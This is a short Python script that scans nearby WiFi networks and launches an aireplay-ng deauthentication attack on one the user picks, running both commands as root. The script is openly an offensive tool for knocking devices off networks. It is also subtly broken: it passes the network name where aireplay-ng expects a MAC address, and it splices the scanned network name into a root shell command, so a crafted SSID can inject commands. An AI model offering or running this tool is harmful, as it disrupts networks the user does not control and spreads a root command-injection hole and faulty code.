import subprocess
import re

def scan_wifi():
    networks = []
    try:
        # Run command to scan WiFi networks
        output = subprocess.check_output(['su', '-c', 'iwlist wlan0 scan'], universal_newlines=True)
        # Use regex to find network names
        networks = re.findall(r'ESSID:"(.*?)"', output)
    except subprocess.CalledProcessError:
        print("Error: Could not scan WiFi networks.")
    return networks

def deauth_attack(network):
    try:
        # Run command to deauthenticate devices on selected network
        subprocess.run(['su', '-c', 'aireplay-ng --deauth 100 -a ' + network + ' wlan0'], check=True)
        print("Deauthentication attack initiated...")
    except subprocess.CalledProcessError:
        print("Error: Could not initiate deauthentication attack.")

def main():
    print("Scanning available WiFi networks...")
    available_networks = scan_wifi()
    if not available_networks:
        print("No WiFi networks found.")
        return
    
    print("Available WiFi networks:")
    for i, network in enumerate(available_networks):
        print(f"{i+1}. {network}")

    choice = int(input("Enter the number corresponding to the network you want to attack: "))
    if choice < 1 or choice > len(available_networks):
        print("Invalid choice.")
        return
    
    selected_network = available_networks[choice - 1]
    print(f"Initiating deauthentication attack on {selected_network}...")
    deauth_attack(selected_network)

if __name__ == "__main__":
    main()
